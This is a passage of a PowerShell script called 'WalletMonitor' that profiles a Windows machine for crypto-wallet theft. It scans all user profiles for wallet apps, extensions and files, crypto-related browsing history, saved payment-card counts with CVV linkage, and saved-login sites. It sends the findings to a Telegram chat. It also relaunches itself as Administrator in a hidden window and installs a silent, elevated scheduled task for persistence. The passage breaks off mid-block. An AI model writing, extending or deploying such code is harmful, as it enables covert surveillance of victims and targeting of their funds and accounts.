                if (-not $reason) { continue }

                $results++
                $typeTxt = 'File'; if ($isDir) { $typeTxt = 'Directory' }
                $sizeTxt = '-'
                if (-not $isDir) { try { $sizeTxt = ('{0:N0} bytes' -f $e.Length) } catch { $sizeTxt = '-' } }
                $modTxt = 'unknown'
                try { $modTxt = $e.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss') } catch { }

                $msg = @()
                $msg += '🔵 <b>New detection: filesystem artifact</b>'
                $msg += '━━━━━━━━━━━━━━━━'
                $msg += "📄 Name: <code>$(ConvertTo-HtmlSafe (Limit-Text $e.Name 120))</code>"
                $msg += "🧾 Type: $typeTxt"
                $msg += "📁 Path: <code>$(ConvertTo-HtmlSafe (Limit-Text (Split-Path -Parent $full) 220))</code>"
                $msg += "📐 Size: $sizeTxt"
                $msg += "🕒 Modified: $modTxt"
                $msg += "✅ Reason: $(ConvertTo-HtmlSafe (Limit-Text $reason 160))"
                $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
                $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"

                $key = "file|$full"
                $isNew = Register-Finding -Type 'file' -Key $key -Label (Limit-Text $full 120) -Message ($msg -join "`n")
                if ($isNew) { Add-DailyCounter -Type 'file' }
                Write-Log "Filesystem artifact: $full" 'INFO'
            }
        }
    }
    Write-Log "Scanned $visited items, matching results: $results"
}

# =====================================================================
#  14)  Build the browser history report (sorted + classified + filtered)
# =====================================================================

function Split-MessageChunks {
    param([string[]]$Lines, [int]$MaxChars = 3500)
    $chunks = New-Object System.Collections.ArrayList
    if ($null -eq $Lines -or @($Lines).Count -eq 0) { return @() }
    $cur = New-Object System.Text.StringBuilder
    foreach ($ln in $Lines) {
        $add = "$ln`n"
        if ($cur.Length -gt 0 -and ($cur.Length + $add.Length) -gt $MaxChars) {
            [void]$chunks.Add($cur.ToString().TrimEnd("`n"))
            $cur = New-Object System.Text.StringBuilder
        }
        [void]$cur.Append($add)
    }
    if ($cur.Length -gt 0) { [void]$chunks.Add($cur.ToString().TrimEnd("`n")) }
    return @($chunks)
}

function Build-HistoryReportLines {
    <# Builds a professional history report: sorted + classified + filtered + statistics. #>
    param($Hits, $ReportCfg)

    $include = @(Get-Prop $ReportCfg 'include_categories' @('wallet', 'exchange', 'dapp', 'crypto'))
    $topPer  = [int](Get-Prop $ReportCfg 'top_per_category' 15)
    $sortBy  = [string](Get-Prop $ReportCfg 'sort_by' 'visits')
    $topDom  = [int](Get-Prop $ReportCfg 'top_domains' 10)
    $recentN = [int](Get-Prop $ReportCfg 'recent_items' 8)

    $all = @($Hits)
    $sel = @($all | Where-Object { $include -contains $_.Category })

    $lookback = [int](Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'lookback_days' 0)
    $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm')

    $lines = New-Object System.Collections.ArrayList
    [void]$lines.Add('🔗 <b>Browser history report — WalletMonitor</b>')
    [void]$lines.Add('━━━━━━━━━━━━━━━━')
    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
    [void]$lines.Add("🕒 Report time: $ts")
    if ($lookback -gt 0) { [void]$lines.Add("📅 Period: last $lookback day(s)") }
    else { [void]$lines.Add('📅 Period: full history (no time limit)') }
    [void]$lines.Add("📊 Entries scanned: <b>$($all.Count)</b> · matching: <b>$($sel.Count)</b>")

    # Category distribution
    $summary = @()
    foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto')) {
        if ($include -notcontains $cat) { continue }
        $c = @($sel | Where-Object { $_.Category -eq $cat }).Count
        if ($c -gt 0) { $meta = Get-CategoryMeta $cat; $summary += "$($meta.Icon) $($meta.Title): <b>$c</b>" }
    }
    if ($summary.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add('🧭 Distribution by category:')
        foreach ($s in $summary) { [void]$lines.Add("   • $s") }
    }

    # Distribution by browser (all browsers that saw the URL)
    $byBrowser = @{}
    foreach ($h in $sel) {
        $names = @($h.Browsers)
        if ($names.Count -eq 0) { $names = @(([string]$h.Browser) -split '\s*,\s*') }
        foreach ($k in $names) {
            if ([string]::IsNullOrWhiteSpace($k)) { continue }
            if ($byBrowser.ContainsKey($k)) { $byBrowser[$k]++ } else { $byBrowser[$k] = 1 }
        }
    }
    if ($byBrowser.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add('🌐 By browser:')
        foreach ($e in @($byBrowser.GetEnumerator() | Sort-Object Value -Descending)) {
            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $e.Key): <b>$($e.Value)</b>")
        }
    }

    # Saved payment cards (count-only - no extraction)
    $ccSumCfg = Get-Prop $Script:Cfg 'credit_cards' $null
    if ([bool](Get-Prop $ccSumCfg 'enabled' $true) -and @($Script:CardStats).Count -gt 0) {
        $cAgg = @(Get-CardAggregate)
        $cTot = Get-CardSummaryTotals
        [void]$lines.Add('')
        [void]$lines.Add('━━━━━━━━━━━━━━━━')
        [void]$lines.Add("💳 <b>Saved payment cards</b> (count-only) — total: <b>$($cTot.Cards)</b>")
        foreach ($g in $cAgg) {
            $cvvTxt = if ($g.CvvKnown) { "CVV linked: $($g.CvvLinked)" } else { 'CVV: unknown' }
            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): cards <b>$($g.Cards)</b> · $cvvTxt")
        }
    }

    # Sections (each category sorted)
    foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto', 'other')) {
        if ($include -notcontains $cat) { continue }
        $grouped = @($sel | Where-Object { $_.Category -eq $cat })
        if ($grouped.Count -eq 0) { continue }

        if ($sortBy -eq 'recent') {
            $sorted = @($grouped | Sort-Object @{Expression = 'Last'; Descending = $true}, @{Expression = 'Visits'; Descending = $true})
        } else {
            $sorted = @($grouped | Sort-Object @{Expression = 'Visits'; Descending = $true}, @{Expression = 'Last'; Descending = $true})
        }

        $meta = Get-CategoryMeta $cat
        [void]$lines.Add('')
        [void]$lines.Add('━━━━━━━━━━━━━━━━')
        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b> — $($grouped.Count) entry(ies)")

        $i = 0
        foreach ($e in $sorted) {
            if ($i -ge $topPer) {
                $rest = $grouped.Count - $topPer
                if ($rest -gt 0) { [void]$lines.Add("   … and $rest more entries in this category.") }
                break
            }
            $i++
            $hostTxt = ConvertTo-HtmlSafe $e.Host
            $lastTxt = ConvertTo-HtmlSafe $e.Last
            $brs = @($e.Browsers)
            $brSuffix = ''
            if ($brs.Count -gt 1) { $brSuffix = " · 🌐 " + (ConvertTo-HtmlSafe ($brs -join '+')) }
            [void]$lines.Add("$i) <b>$hostTxt</b> · 👁 $($e.Visits) · 🕒 $lastTxt$brSuffix")
            [void]$lines.Add("   🔗 <code>$(ConvertTo-HtmlSafe (Limit-Text $e.Url 160))</code>")
        }
    }

    # Most visited domains
    if ($sel.Count -gt 0 -and $topDom -gt 0) {
        # Note: we sum the visit count (Visits) per domain, not the number of distinct URLs,
        # so the ranking reflects actual usage intensity. If the visit counter is missing we use 1 as a minimum.
        $counts = @{}
        foreach ($h in $sel) {
            $k = $h.Host
            $v = [int](Get-Prop $h 'Visits' 0)
            if ($v -lt 1) { $v = 1 }
            if ($counts.ContainsKey($k)) { $counts[$k] = [int]$counts[$k] + $v } else { $counts[$k] = $v }
        }
        $top = @($counts.GetEnumerator() | Sort-Object Value -Descending | Select-Object -First $topDom)
        if ($top.Count -gt 0) {
            [void]$lines.Add('')
            [void]$lines.Add('━━━━━━━━━━━━━━━━')
            [void]$lines.Add('🏆 <b>Most visited domains</b> <i>(total visits)</i>')
            $i = 0
            foreach ($e in $top) { $i++; [void]$lines.Add("$i) $(ConvertTo-HtmlSafe $e.Key) — <b>$($e.Value)</b>") }
        }
    }

    # Recent activity
    if ($sel.Count -gt 0 -and $recentN -gt 0) {
        $recent = @($sel | Where-Object { $_.LastTs } | Sort-Object LastTs -Descending | Select-Object -First $recentN)
        if ($recent.Count -gt 0) {
            [void]$lines.Add('')
            [void]$lines.Add('━━━━━━━━━━━━━━━━')
            [void]$lines.Add('🕒 <b>Recent activity</b>')
            foreach ($e in $recent) {
                [void]$lines.Add("   • $(ConvertTo-HtmlSafe $e.Host) · $(ConvertTo-HtmlSafe $e.Last) · $($e.Browser)")
            }
        }
    }

    if ($sel.Count -eq 0) {
        [void]$lines.Add('')
        [void]$lines.Add('ℹ️ No entries in the requested categories during the specified period.')
    }

    return @($lines)
}

function Send-HistoryReport {
    param([switch]$Force)

    # Per-user reporting interval: each scanned profile keeps its own timestamp.
    $uNow = [string]$env:USERNAME
    if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }

    $reportCfg = Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report' @{}
    $mode      = [string](Get-Prop $reportCfg 'mode' 'always')
    $minHours  = [int](Get-Prop $reportCfg 'min_hours_between_reports' 6)
    $maxChars  = [int](Get-Prop $reportCfg 'max_message_chars' 3500)

    if (-not $Force) {
        if (@($Script:HistoryHits).Count -eq 0) { Write-Log 'No history entries to send in a report.' 'DEBUG'; return }

        $last = ''
        foreach ($te in @($Script:State.history_ts)) { if ([string]$te.user -eq $uNow) { $last = [string]$te.ts; break } }
        if (-not $last) { $last = [string]$Script:State.last_report_ts }
        if ($last) {
            $dt = $null
            try { $dt = [datetime]::Parse($last) } catch { $dt = $null }
            if ($dt) {
                $hours = ((Get-Date) - $dt).TotalHours
                if ($hours -lt $minHours) {
                    Write-Log ("Skipping history report (last report was {0:N1} hour(s) ago, minimum $minHours)." -f $hours) 'DEBUG'
                    return
                }
            }
        }

        if ($mode -eq 'new_only' -and $Script:NewHistoryCount -le 0) {
            Write-Log 'Skipping history report (new_only mode and nothing new).' 'DEBUG'
            return
        }
    }

    $lines = Build-HistoryReportLines -Hits $Script:HistoryHits -ReportCfg $reportCfg
    if (@($lines).Count -eq 0) { return }

    $chunks = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
    $total = $chunks.Count
    $sentAll = $true
    for ($i = 0; $i -lt $total; $i++) {
        $prefix = ''
        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
        $ok = Send-TelegramMessage -Text ($prefix + $chunks[$i])
        if (-not $ok) { $sentAll = $false }
    }
    if ($sentAll) {
        $nowTxt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        $Script:State.last_report_ts = $nowTxt
        $tsArr = New-Object System.Collections.ArrayList
        foreach ($te in @($Script:State.history_ts)) { if ([string]$te.user -ne $uNow) { [void]$tsArr.Add($te) } }
        [void]$tsArr.Add([PSCustomObject]@{ user = $uNow; ts = $nowTxt })
        $Script:State.history_ts = $tsArr
        Write-Log "History report sent ($total message(s))."
    } else {
        Write-Log 'Failed to send part of the history report.' 'ERROR'
    }
}

# =====================================================================
#  15)  New-detection notifications (grouped by type)
# =====================================================================

function Send-NewFindings {
    $items = @($Script:NewItems)
    if ($items.Count -eq 0) {
        Write-Log 'No new detections (other than history) in this run.'
        return
    }

    Write-Log "Number of new detections: $($items.Count)"

    $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4; 'card' = 5; 'login' = 6 }
    $items = @($items | Sort-Object @{ Expression = { [int]$order[$_.Type] } }, @{ Expression = { $_.Label } })

    $d = @($items | Where-Object { $_.Type -eq 'desktop' }).Count
    $x = @($items | Where-Object { $_.Type -eq 'extension' }).Count
    $f = @($items | Where-Object { $_.Type -eq 'file' }).Count
    $cd = @($items | Where-Object { $_.Type -eq 'card' }).Count

    # Summary message first (quick overview)
    $head = @()
    $head += '📥 <b>New detections — WalletMonitor</b>'
    $head += '━━━━━━━━━━━━━━━━'
    $head += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $head += "🕒 Time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $head += "📊 Total: <b>$($items.Count)</b>"
    $head += "🔴 Desktop wallets: $d"
    $head += "🟠 Browser extensions: $x"
    $head += "🔵 File artifacts: $f"
    $lg = @($items | Where-Object { $_.Type -eq 'login' }).Count
    if ($cd -gt 0) { $head += "💳 Saved cards: change in $cd group(s)" }
    if ($lg -gt 0) { $head += "🔑 Saved logins: change in $lg group(s)" }
    if ($Script:NewHistoryCount -gt 0) { $head += "🟡 New site visits: $($Script:NewHistoryCount) (shown in the history report)" }
    [void](Send-TelegramMessage -Text ($head -join "`n"))
    $Script:SentCount++

    # Details
    $limit = if ($Script:MaxPerRun -gt 0) { $Script:MaxPerRun } else { $items.Count }
    $i = 0
    foreach ($it in $items) {
        if ($i -ge $limit) {
            $rest = $items.Count - $limit
            [void](Send-TelegramMessage -Text "📎 $rest additional detection(s) were not detailed (max_notifications_per_run reached). Check the log.")
            break
        }
        if (Send-TelegramMessage -Text $it.Message) { $Script:SentCount++ }
        $i++
    }
    Write-Log "New-detection notifications sent."
}

# =====================================================================
#  16)  Daily summary
# =====================================================================

function Invoke-DailySummaryIfDue {
    $sched = Get-Prop $Script:Cfg 'schedule' $null
    $ds = Get-Prop $sched 'daily_summary' $null
    if (-not $ds -or -not [bool](Get-Prop $ds 'enabled' $true)) { return }

    $hour = [int](Get-Prop $ds 'hour' 21)
    $now = Get-Date
    $today = $now.ToString('yyyy-MM-dd')

    if ($now.Hour -lt $hour) { return }
    if ([string]$Script:State.last_summary_date -eq $today) { return }

    $entry = $null
    foreach ($dd in $Script:State.daily) { if ($dd.date -eq $today) { $entry = $dd; break } }
    $d = 0; $x = 0; $h = 0; $f = 0
    if ($entry) {
        $d = [int](Get-Prop $entry 'desktop' 0)
        $x = [int](Get-Prop $entry 'extension' 0)
        $h = [int](Get-Prop $entry 'history' 0)
        $f = [int](Get-Prop $entry 'file' 0)
    }
    $total = $d + $x + $h + $f

    $msg = @()
    $msg += '📊 <b>Daily summary — WalletMonitor</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "📅 Date: $today"
    $msg += "🔴 Desktop wallets: $d"
    $msg += "🟠 Browser extensions: $x"
    $msg += "🟡 Site visits: $h"
    $msg += "🔵 Suspicious files/directories: $f"
    $msg += "∑ Total: <b>$total</b>"
    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    if ($total -eq 0) { $msg += '✅ No new detections today.' }

    if (Send-TelegramMessage -Text ($msg -join "`n")) {
        $Script:State.last_summary_date = $today
        Write-Log 'Daily summary sent.'
    }
}

# =====================================================================
#  17)  Error notifications
# =====================================================================

function Send-ErrorNotification {
    if (-not $Script:NotifyOnError) { return }
    $errs = @($Script:RunErrors | Select-Object -Unique)
    if ($errs.Count -eq 0) { return }

    $msg = @()
    $msg += '⚠️ <b>Alert: monitoring-tool problems</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $msg += "🕒 Time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $msg += '❗️ Details:'
    foreach ($e in ($errs | Select-Object -First 15)) { $msg += "• $(ConvertTo-HtmlSafe (Limit-Text $e 220))" }
    if ($errs.Count -gt 15) { $msg += "• ... and $($errs.Count - 15) more error(s) (check the log)." }
    $msg += '📄 See the log file: <code>wallet-monitor.log</code>'

    [void](Send-TelegramMessage -Text ($msg -join "`n"))
}

# =====================================================================
#  18)  Scheduled-task registration (Task Scheduler) - from the same file
# =====================================================================

function Test-Admin {
    try {
        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $p = New-Object System.Security.Principal.WindowsPrincipal($id)
        return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

function Show-TaskStatus {
    $taskName = 'WalletMonitor'
    $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $t) { Write-Console "Task '$taskName' is not registered." -ForegroundColor Yellow; return }
    $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
    Write-Console "Task: $taskName"
    Write-Console "State: $($t.State)"
    if ($info) {
        Write-Console "Last run: $($info.LastRunTime)"
        Write-Console "Last run result: $($info.LastTaskResult)"
        Write-Console "Next run: $($info.NextRunTime)"
    }
}

function Install-Task {
    param([int]$Minutes)
    $taskName = 'WalletMonitor'
    if (-not $Minutes -or $Minutes -lt 1) { $Minutes = 30 }

    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $Script:SelfPath }
    if (-not $scriptPath -or -not (Test-Path -LiteralPath $scriptPath)) {
        Write-Console 'Could not determine the current file path to register the task.' -ForegroundColor Red; return
    }

    if (-not (Test-Admin)) {
        Write-Console 'This command must be run from an elevated PowerShell (Run as Administrator).' -ForegroundColor Red
        return
    }

    try {
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
            -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""

        $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(2)) `
            -RepetitionInterval (New-TimeSpan -Minutes $Minutes) `
            -RepetitionDuration (New-TimeSpan -Days 3650)

        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -MultipleInstances IgnoreNew `
            -ExecutionTimeLimit (New-TimeSpan -Hours 1)

        $runLevel = [string](Get-Prop (Get-Prop $Script:Cfg 'schedule') 'run_level' 'highest')
        if ($runLevel -notin @('highest', 'limited')) { $runLevel = 'highest' }

        $principal = New-ScheduledTaskPrincipal `
            -UserId "$env:USERDOMAIN\$env:USERNAME" `
            -LogonType Interactive `
            -RunLevel $runLevel

        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -Force `
            -Description 'WalletMonitor - crypto wallet artifact monitoring with Telegram notifications' | Out-Null

        Write-Console "Task '$taskName' registered successfully." -ForegroundColor Green
        Write-Console "First run: $((Get-Date).AddMinutes(2).ToString('yyyy-MM-dd HH:mm'))"
        Write-Console "Interval: every $Minutes minute(s)"
        Write-Console "Run level: $runLevel"
        if ($runLevel -eq 'highest') { Write-Console 'The task runs with Administrator rights and silently on every cycle (no window, no UAC).' -ForegroundColor Green }
        Write-Console 'Note: the task only runs while the user is logged on (LogonType Interactive).'
    } catch {
        Write-Console "Failed to register the task: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Uninstall-Task {
    $taskName = 'WalletMonitor'
    if (-not (Test-Admin)) {
        Write-Console 'This command must be run from an elevated PowerShell (Run as Administrator).' -ForegroundColor Red
        return
    }
    $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($t) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Write-Console "Task '$taskName' removed." -ForegroundColor Green
    } else {
        Write-Console "Task '$taskName' does not exist." -ForegroundColor Yellow
    }
}

# =====================================================================
#  19)  Full scan cycle
# =====================================================================

function Send-StartupNotification {
    $tg = Get-Prop $Script:Cfg 'telegram' $null
    if (-not [bool](Get-Prop $tg 'notify_on_start' $true)) { return }

    $msg = @()
    $msg += '✅ <b>WalletMonitor is running</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $msg += "👤 User: <code>$(ConvertTo-HtmlSafe $env:USERNAME)</code>"
    $msg += "🕒 Start time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $msg += "⏱ Scan every $($Script:IntervalMinutes) minute(s)"
    [void](Send-TelegramMessage -Text ($msg -join "`n"))
}

function Invoke-FullScan {
    $cycleStart = Get-Date
    Write-Log '=========== Starting a new scan cycle ==========='
    $Script:RunErrors = New-Object System.Collections.ArrayList
    $Script:FoundItems = New-Object System.Collections.ArrayList
    $Script:NewItems = New-Object System.Collections.ArrayList
    $Script:SentCount = 0

    $scanCfg = Get-Prop $Script:Cfg 'scan' $null

    if ([bool](Get-Prop $scanCfg 'installed_programs' $true)) {
        try { Invoke-InstalledProgramScan }
        catch { Add-Error "Installed-programs scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
    }

    # The remaining checks run per user profile: exactly once in a normal user session
    # (or a ScanAllUsers-style per-user relaunch), and once for every real user profile
    # when the task runs as SYSTEM. Fingerprints are stored per user so a change in one
    # profile never masks or fakes a change in another.
    $Script:CycleNewTotal = 0
    Invoke-ForEachProfile {
        if ([bool](Get-Prop $scanCfg 'browser_extensions' $true)) {
            try { Invoke-BrowserExtensionScan }
            catch { Add-Error "Browser-extension scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
        }

        if ([bool](Get-Prop $scanCfg 'browser_history' $true)) {
            try { Invoke-BrowserHistoryScan }
            catch { Add-Error "Browser-history scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
        }

        if ([bool](Get-Prop $scanCfg 'filesystem' $true)) {
            try { Invoke-FileSystemScan }
            catch { Add-Error "Filesystem scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
        }

        if ([bool](Get-Prop $scanCfg 'credit_cards' $true)) {
            try {
                Invoke-BrowserCardScan
                $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
                if ([bool](Get-Prop $ccCfg 'notify_on_change' $true)) {
                    $sig  = Get-CardSignature
                    # The fingerprint is kept per user profile; otherwise one profile would
                    # overwrite the next in SYSTEM multi-profile scans and cause false alerts.
                    $uNow = [string]$env:USERNAME
                    if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
                    $prev = ''
                    foreach ($ce in @($Script:State.card_sigs)) { if ([string]$ce.user -eq $uNow) { $prev = [string]$ce.sig; break } }
                    # The first run for a profile records the fingerprint silently; notification only when the counts/CVV linkage change.
                    if ($prev -and $prev -ne $sig) {
                        $msg = (Build-CardReportLines -Full) -join "`n"
                        [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'card'; Key = "card|$uNow|$sig"; Label = "Saved cards (changed - $uNow)"; Message = $msg })
                    }
                    $keepSigs = New-Object System.Collections.ArrayList
                    foreach ($ce in @($Script:State.card_sigs)) { if ([string]$ce.user -ne $uNow) { [void]$keepSigs.Add($ce) } }
                    [void]$keepSigs.Add([PSCustomObject]@{ user = $uNow; sig = $sig })
                    $Script:State.card_sigs = $keepSigs
                    $Script:State.card_sig = $sig
                }
            } catch {
                Add-Error "Card scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
            }
        }

        if ([bool](Get-Prop $scanCfg 'saved_logins' $true)) {
            try {
                Invoke-BrowserLoginScan
                $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
                if ([bool](Get-Prop $lgCfg 'notify_on_change' $true)) {
                    $lsig  = Get-LoginSignature
                    # The fingerprint is kept per user profile; otherwise one profile would
                    # overwrite the next in SYSTEM multi-profile scans and cause false alerts.
                    $uNow  = [string]$env:USERNAME
                    if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
                    $lprev = ''
                    foreach ($le in @($Script:State.login_sigs)) { if ([string]$le.user -eq $uNow) { $lprev = [string]$le.sig; break } }
                    # The first run for a profile records the fingerprint silently; notification only when the set of sites changes.
                    if ($lprev -and $lprev -ne $lsig) {
                        $lmsg = (Build-LoginReportLines -Full) -join "`n"
                        [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'login'; Key = "login|$uNow|$lsig"; Label = "Saved logins (changed - $uNow)"; Message = $lmsg })
                    }
                    $newSigs = New-Object System.Collections.ArrayList
                    foreach ($le in @($Script:State.login_sigs)) { if ([string]$le.user -ne $uNow) { [void]$newSigs.Add($le) } }
                    [void]$newSigs.Add([PSCustomObject]@{ user = $uNow; sig = $lsig })
                    $Script:State.login_sigs = $newSigs
                }
            } catch {
                Add-Error "Login scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
            }
        }

        Send-NewFindings
        Send-HistoryReport
        Send-ErrorNotification
        Invoke-DailySummaryIfDue

        Save-State

        # The profile run is complete: remember its new-detection count and reset the
        # per-run collectors so the next profile starts clean.
        $Script:CycleNewTotal += [int]@($Script:NewItems).Count
        $Script:NewItems  = New-Object System.Collections.ArrayList
        $Script:RunErrors = New-Object System.Collections.ArrayList
    }

    $dur = [int]((Get-Date) - $cycleStart).TotalSeconds
    Write-Log "=========== Cycle finished (total results: $($Script:FoundItems.Count) | new: $($Script:CycleNewTotal) | duration: ${dur}s) ==========="
}

# =====================================================================
#  20)  Entry point (Main)
# =====================================================================

$Script:SelfPath = $PSCommandPath
if (-not $Script:SelfPath) { $Script:SelfPath = $MyInvocation.MyCommand.Path }

# Merge an external config file (optional) over the embedded block
if ($Script:ConfigFile) {
    try {
        $ext = Read-JsonFile $Script:ConfigFile
        Merge-Config $CONFIG $ext
        Write-Console "Additional config loaded from: $($Script:ConfigFile)"
    } catch {
        Write-Console "Warning: could not read the config file '$($Script:ConfigFile)' — $($_.Exception.Message)" -ForegroundColor Yellow
    }
}
$Script:Cfg = $CONFIG
$Script:Wallets = $WALLETS

$hostLabelCfg = [string](Get-Prop $Script:Cfg 'host_label' '')
if ($hostLabelCfg) { $Script:HostLabel = $hostLabelCfg }

if ($Help) {
    Write-Console 'WalletMonitor v3.1 — crypto wallet artifact monitoring (single file, no Python)' 'Cyan'
    Write-Console ''
    Write-Console '  (no switches)    one silent scan + Telegram notifications'
    Write-Console '  -Console         show output on screen'
    Write-Console '  -ScanNow         run a scan immediately'
    Write-Console '  -TestNotify      send a test message to Telegram'
    Write-Console '  -HistoryReport   send the browser history report now'
    Write-Console '  -CardReport      send the saved payment-card report (count-only)'
    Write-Console '  -LoginReport     send saved-login sites sorted by category (banks/wallets/exchanges/dApps/other; URLs only)'
    Write-Console '  -Elevate         relaunch the tool with Administrator rights silently (hidden window)'
    Write-Console '  -Loop            continuous monitoring loop (per schedule.interval_minutes)'
    Write-Console '  -Install         register a scheduled task that runs as Administrator silently (requires Administrator)'
    Write-Console '  -Uninstall       remove the scheduled task'
    Write-Console '  -TaskStatus      show task status'
    Write-Console '  -ResetState      reset the state file (state.json)'
    Write-Console '  -NoNotify        disable Telegram sending'
    Write-Console '  -ConfigPath <f>  load an external config file over the embedded one'
    Write-Console ''
    exit 0
}

# ---- Elevation: relaunch itself as Administrator with a hidden window ----
if ($Elevate -and -not (Test-Admin)) {
    $self = $PSCommandPath
    if (-not $self) { $self = $Script:SelfPath }
    if (-not $self -or -not (Test-Path -LiteralPath $self)) {
        Write-Console 'Could not determine the file path for relaunching with elevated rights.' -ForegroundColor Red
        exit 3
    }

    $keep = New-Object System.Collections.ArrayList
    foreach ($pair in @(
            @{ On = $ScanNow;       Arg = '-ScanNow' },
            @{ On = $HistoryReport; Arg = '-HistoryReport' },
            @{ On = $CardReport;    Arg = '-CardReport' },
            @{ On = $LoginReport;   Arg = '-LoginReport' },
            @{ On = $TestNotify;    Arg = '-TestNotify' },
            @{ On = $Install;       Arg = '-Install' },
            @{ On = $Uninstall;     Arg = '-Uninstall' },
            @{ On = $TaskStatus;    Arg = '-TaskStatus' },
            @{ On = $Loop;          Arg = '-Loop' },
            @{ On = $NoNotify;      Arg = '-NoNotify' },
            @{ On = $Console;       Arg = '-Console' },
            @{ On = $ResetState;    Arg = '-ResetState' }
        )) {
        if ([bool]$pair.On) { [void]$keep.Add([string]$pair.Arg) }
    }
    if ($IntervalMinutes -gt 0) { [void]$keep.Add('-IntervalMinutes'); [void]$keep.Add("$IntervalMinutes") }
    if ($ConfigPath) { [void]$keep.Add('-ConfigPath'); [void]$keep.Add('"' + $ConfigPath + '"') }

    $argLine = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $self + '" ' + ($keep -join ' ')
    Write-Console 'Relaunching with Administrator rights (hidden window)...' 'Cyan'
    try {
        Start-Process -FilePath 'powershell.exe' -ArgumentList $argLine -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
        Write-Console 'The elevated instance was launched successfully.' -ForegroundColor Green
        exit 0
    } catch {
        Write-Console "Elevation failed: $($_.Exception.Message)" -ForegroundColor Red
        exit 3
    }
}

# ---- Scheduled-task management (does not require running the scan) ----
if ($TaskStatus) { Show-TaskStatus; exit 0 }
if ($Uninstall)  { Uninstall-Task; exit 0 }
if ($Install) {
    $m = $IntervalMinutes
    if (-not $m -or $m -lt 1) { $m = [int](Get-Prop (Get-Prop $Script:Cfg 'schedule') 'interval_minutes' 30) }
    Install-Task -Minutes $m
    exit 0
}

Initialize-Log
Rotate-LogIfNeeded
Write-Log '################ WalletMonitor v3.1 (single file, no Python) ################'

Initialize-Telegram
Initialize-State

$Script:IntervalMinutes = [int](Get-Prop (Get-Prop $Script:Cfg 'schedule') 'interval_minutes' 30)
if ($IntervalMinutes -gt 0) { $Script:IntervalMinutes = $IntervalMinutes }
if ($Script:IntervalMinutes -lt 1) { $Script:IntervalMinutes = 30 }

if ($TestNotify) {
    Write-Console 'Sending a test message to Telegram...'
    $txt = "🔔 <b>Test message — WalletMonitor</b>`n━━━━━━━━━━━━━━━━`n✅ The Telegram link works correctly.`n🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>`n🕒 $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $ok = Send-TelegramMessage -Force -Text $txt
    if ($ok) { Write-Console 'Sent successfully.' -ForegroundColor Green; exit 0 }
    else { Write-Console 'Sending failed. Check the token and chat_id.' -ForegroundColor Red; exit 2 }
}

if ($HistoryReport) {
    Write-Console 'Running the browser history report...'
    Invoke-ForEachProfile {
